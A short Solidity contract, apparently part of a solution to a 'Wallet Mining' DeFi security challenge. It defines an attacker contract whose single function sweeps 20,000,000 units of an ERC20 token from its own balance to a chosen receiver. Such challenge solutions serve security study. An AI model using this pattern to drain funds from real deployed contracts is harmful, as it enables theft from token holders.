// SPDX-License-Identifier: MIT
pragma solidity ^0.8.4;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

contract WalletMiningAttacker {
    function attack(address _token, address _receiver) public {
        IERC20(_token).transfer(_receiver, 20000000 ether);
    }
}